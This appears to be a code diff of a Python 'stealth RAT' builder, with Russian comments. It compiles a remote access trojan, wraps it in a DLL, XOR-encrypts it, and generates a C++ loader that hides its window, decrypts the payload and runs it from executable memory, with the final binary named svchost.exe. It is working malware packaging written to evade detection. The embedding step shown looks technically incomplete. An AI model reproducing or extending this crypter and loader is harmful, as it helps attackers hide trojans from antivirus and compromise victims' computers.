@@ -1,22 +1,18 @@
-# build.py - Сборка EXE с зашифрованной DLL (БИНАРНАЯ ВЕРСИЯ)
+# build.py - БИНАРНОЕ встраивание (без 80 MB текста!)
 import os
 import sys
 import subprocess
 import random
 import zlib
 import shutil
-import tempfile
-import struct
 
 class StealthBuilder:
     def __init__(self, token, admin_id):
         self.token = token
         self.admin_id = admin_id
-        # Генерируем случайный XOR ключ
         self.xor_key = bytes([random.randint(1, 255) for _ in range(16)])
         
     def build_exe_with_pyinstaller(self):
-        """Собирает обычный EXE с PyInstaller (со всем Python внутри)"""
         print("[+] Building EXE with PyInstaller...")
         
         cmd = [
@@ -69,7 +65,6 @@ class StealthBuilder:
         return "payload.exe"
     
     def convert_exe_to_dll(self, exe_path):
-        """Конвертирует EXE в DLL"""
         print("[+] Converting EXE to DLL...")
         
         with open(exe_path, 'rb') as f:
@@ -80,10 +75,9 @@ class StealthBuilder:
 #include <stdio.h>
 #include <stdlib.h>
 
-static unsigned char exe_data[] = {
-DATA
-};
-static unsigned int exe_size = SIZE;
+// Данные встраиваются через objcopy (бинарно!)
+extern unsigned char _binary_payload_bin_start[];
+extern unsigned char _binary_payload_bin_end[];
 
 static void RunEXE() {
     char temp_path[MAX_PATH];
@@ -93,6 +87,9 @@ static void RunEXE() {
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
     
+    // Размер данных
+    size_t exe_size = _binary_payload_bin_end - _binary_payload_bin_start;
+    
     GetTempPathA(MAX_PATH, temp_path);
     sprintf(exe_path, "%s\\\\tmp_%x.exe", temp_path, GetTickCount());
     
@@ -100,7 +97,7 @@ static void RunEXE() {
                         CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return;
     
-    WriteFile(hFile, exe_data, exe_size, &written, NULL);
+    WriteFile(hFile, _binary_payload_bin_start, exe_size, &written, NULL);
     CloseHandle(hFile);
     
     ZeroMemory(&si, sizeof(si));
@@ -123,24 +120,19 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
     return TRUE;
 }
 '''
-        # Конвертируем EXE в HEX строку
-        hex_parts = []
-        for i, b in enumerate(exe_data):
-            if i > 0 and i % 16 == 0:
-                hex_parts.append('\n    ')
-            hex_parts.append(f'0x{b:02X}, ')
+        # Сохраняем бинарные данные
+        with open('payload.bin', 'wb') as f:
+            f.write(exe_data)
         
-        hex_string = ''.join(hex_parts).rstrip(', ')
+        # Сохраняем DLL код
+        with open('payload_dll.c', 'w') as f:
+            f.write(dll_template)
         
-        dll_code = dll_template.replace('DATA', hex_string)
-        dll_code = dll_code.replace('SIZE', str(len(exe_data)))
-        
-        with open('payload_dll.c', 'w', encoding='utf-8') as f:
-            f.write(dll_code)
-        
+        # Компилируем DLL с БИНАРНЫМ встраиванием через objcopy
         cmd = [
             'gcc', '-shared', '-o', 'payload.dll',
             'payload_dll.c',
+            'payload.bin',  # ← БИНАРНЫЕ данные!
             '-static', '-s', '-O2',
             '-Wl,--subsystem,windows',
             '-luser32', '-lkernel32'
@@ -156,7 +148,6 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         return "payload.dll"
     
     def encrypt_dll(self, dll_path):
-        """Шифрует DLL"""
         print("[+] Encrypting DLL...")
         
         with open(dll_path, 'rb') as f:
@@ -168,69 +159,133 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         for i in range(len(encrypted)):
             encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
         
+        # Сохраняем зашифрованные данные
+        with open('encrypted.bin', 'wb') as f:
+            f.write(encrypted)
+        
         size_mb = len(encrypted) / (1024*1024)
         print(f"[+] Encrypted! Size: {size_mb:.1f} MB")
         return encrypted
     
-    def bytes_to_c_array(self, data, name):
-        """Конвертирует байты в C массив"""
-        result = f'unsigned char {name}[] = {{\n    '
-        for i, b in enumerate(data):
-            if i > 0:
-                result += ', '
-            result += f'0x{b:02X}'
-            if (i + 1) % 16 == 0:
-                result += ',\n    '
-        result += '\n};\n'
-        return result
+    def build_loader(self):
+        """Собирает загрузчик с БИНАРНЫМ встраиванием"""
+        print("[+] Building loader with binary embedding...")
+        
+        loader_code = '''
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+// Бинарные данные встраиваются через objcopy
+extern unsigned char _binary_encrypted_bin_start[];
+extern unsigned char _binary_encrypted_bin_end[];
+extern unsigned char _binary_key_bin_start[];
+extern unsigned char _binary_key_bin_end[];
+
+static void xor_decrypt(unsigned char* data, size_t len, 
+                        unsigned char* key, size_t key_len) {
+    for (size_t i = 0; i < len; i++) {
+        data[i] ^= key[i % key_len];
+    }
+}
+
+static bool LoadDLLFromMemory(unsigned char* dll_data, size_t dll_size) {
+    if (dll_data[0] != 'M' || dll_data[1] != 'Z') return false;
     
-    def build_loader(self, encrypted_dll):
-        """Собирает финальный загрузчик (БИНАРНЫЙ РЕЖИМ)"""
-        print("[+] Building loader...")
+    void* dll_memory = VirtualAlloc(NULL, dll_size, 
+                                    MEM_COMMIT | MEM_RESERVE, 
+                                    PAGE_EXECUTE_READWRITE);
+    if (!dll_memory) return false;
+    
+    memcpy(dll_memory, dll_data, dll_size);
+    
+    unsigned char* bytes = (unsigned char*)dll_memory;
+    unsigned int e_lfanew = *(unsigned int*)&bytes[0x3C];
+    unsigned int entry_point_rva = *(unsigned int*)&bytes[e_lfanew + 0x28];
+    
+    typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
+    DllMain_t dll_main = (DllMain_t)((unsigned char*)dll_memory + entry_point_rva);
+    
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dll_main, 
+                                  dll_memory, 0, NULL);
+    if (hThread) {
+        CloseHandle(hThread);
+        return true;
+    }
+    
+    return dll_main((HINSTANCE)dll_memory, DLL_PROCESS_ATTACH, NULL) == TRUE;
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
+                   LPSTR lpCmdLine, int nCmdShow) {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    
+    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\\\RatMutex_7F3A8B2C");
+    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
+    
+    size_t dll_len = _binary_encrypted_bin_end - _binary_encrypted_bin_start;
+    size_t key_len = _binary_key_bin_end - _binary_key_bin_start;
+    
+    unsigned char* decrypted = (unsigned char*)malloc(dll_len);
+    if (!decrypted) return 1;
+    
+    memcpy(decrypted, _binary_encrypted_bin_start, dll_len);
+    
+    xor_decrypt(decrypted, dll_len, _binary_key_bin_start, key_len);
+    
+    bool success = LoadDLLFromMemory(decrypted, dll_len);
+    
+    if (!success) {
+        char temp_path[MAX_PATH];
+        char dll_path[MAX_PATH];
+        GetTempPathA(MAX_PATH, temp_path);
+        sprintf(dll_path, "%s\\\\tmp_%x.dll", temp_path, GetTickCount());
         
-        # Читаем loader.cpp в БИНАРНОМ режиме
-        with open('loader.cpp', 'rb') as f:
-            loader = f.read().decode('utf-8', errors='ignore')
+        HANDLE hFile = CreateFileA(dll_path, GENERIC_WRITE, 0, NULL,
+                                   CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            DWORD written;
+            WriteFile(hFile, decrypted, dll_len, &written, NULL);
+            CloseHandle(hFile);
+            
+            LoadLibraryA(dll_path);
+            Sleep(3000);
+            DeleteFileA(dll_path);
+            success = true;
+        }
+    }
+    
+    free(decrypted);
+    
+    if (success) {
+        while (1) Sleep(10000);
+    }
+    
+    return success ? 0 : 1;
+}
+'''
+        # Сохраняем загрузчик
+        with open('loader_final.cpp', 'w') as f:
+            f.write(loader_code)
         
-        # Заменяем плейсхолдеры на C массивы
-        encrypted_array = self.bytes_to_c_array(encrypted_dll, 'encrypted_dll')
-        key_array = self.bytes_to_c_array(self.xor_key, 'xor_key')
-        dll_len_str = f'unsigned int dll_len = {len(encrypted_dll)};'
-        key_len_str = f'unsigned int key_len = {len(self.xor_key)};'
-        
-        # Встраиваем данные
-        loader = loader.replace(
-            'extern unsigned char encrypted_dll[];',
-            encrypted_array
-        )
-        loader = loader.replace(
-            'extern unsigned int dll_len;',
-            dll_len_str
-        )
-        loader = loader.replace(
-            'extern unsigned char xor_key[];',
-            key_array
-        )
-        loader = loader.replace(
-            'extern unsigned int key_len;',
-            key_len_str
-        )
-        
-        # Сохраняем в БИНАРНОМ режиме
-        with open('loader_final.cpp', 'w', encoding='utf-8') as f:
-            f.write(loader)
+        # Сохраняем ключ
+        with open('key.bin', 'wb') as f:
+            f.write(self.xor_key)
         
         print("[+] Loader ready!")
         return 'loader_final.cpp'
     
     def compile_loader(self, loader_path):
-        """Компилирует загрузчик в EXE"""
-        print("[+] Compiling final EXE...")
+        """Компилирует загрузчик с БИНАРНЫМ встраиванием"""
+        print("[+] Compiling final EXE with binary embedding...")
         
+        # Используем objcopy для бинарного встраивания
         cmd = [
             'g++',
             '-o', 'svchost.exe',
             loader_path,
+            'encrypted.bin',  # ← БИНАРНЫЕ данные!
+            'key.bin',        # ← БИНАРНЫЙ ключ!
             '-static',
             '-s',
             '-O2',
@@ -248,11 +303,10 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         return 'svchost.exe'
     
     def build(self):
-        """Полный процесс сборки"""
         print("[+] STARTING STEALTH RAT BUILD")
         print("=" * 60)
         
-        # 1. Обновляем rat.py с токеном
+        # 1. Обновляем rat.py
         print("[+] Updating rat.py...")
         with open('rat.py', 'r', encoding='utf-8') as f:
             content = f.read()
@@ -261,23 +315,27 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         with open('rat.py', 'w', encoding='utf-8') as f:
             f.write(content)
         
-        # 2. Собираем обычный EXE через PyInstaller
+        # 2. Собираем EXE
         exe = self.build_exe_with_pyinstaller()
         if not exe:
             return False
         
-        # 3. Конвертируем EXE в DLL
+        # 3. Конвертируем в DLL
         dll = self.convert_exe_to_dll(exe)
         if not dll:
             return False
         
         # 4. Шифруем DLL
         encrypted = self.encrypt_dll(dll)
+        if not encrypted:
+            return False
         
         # 5. Собираем загрузчик
-        loader = self.build_loader(encrypted)
+        loader = self.build_loader()
+        if not loader:
+            return False
         
-        # 6. Компилируем финальный EXE
+        # 6. Компилируем финальный EXE (БЫСТРО!)
         final_exe = self.compile_loader(loader)
         
         if final_exe:
@@ -285,7 +343,6 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
             print("[+] BUILD COMPLETED SUCCESSFULLY!")
             print(f"[+] FINAL EXE: {final_exe} ({os.path.getsize(final_exe) / 1024:.1f} KB)")
             print(f"[+] Original EXE: {exe} ({os.path.getsize(exe) / (1024*1024):.1f} MB)")
-            print(f"[+] DLL: {dll} ({os.path.getsize(dll) / (1024*1024):.1f} MB)")
             print(f"[+] Key: {self.xor_key.hex()}")
             
             with open('key.txt', 'w') as f:
